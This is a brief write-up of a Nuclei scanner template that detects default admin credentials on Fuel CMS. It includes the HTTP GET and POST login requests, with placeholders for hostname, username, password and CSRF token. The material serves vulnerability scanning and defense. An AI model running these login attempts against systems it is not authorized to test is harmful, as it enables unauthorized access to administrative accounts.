# Nuclei Template: Fuel CMS - Default Admin Discovery
**Template ID:** fuelcms-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`fuelcms-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Fuel CMS default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /fuel/login HTTP/1.1
Host: {{Hostname}}

POST /fuel/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user_name={{username}}&password={{password}}&Login=Login&forward=&ci_csrf_token_FUEL={{csrftoken}}
```

## References
- https://docs.getfuelcms.com/general/security
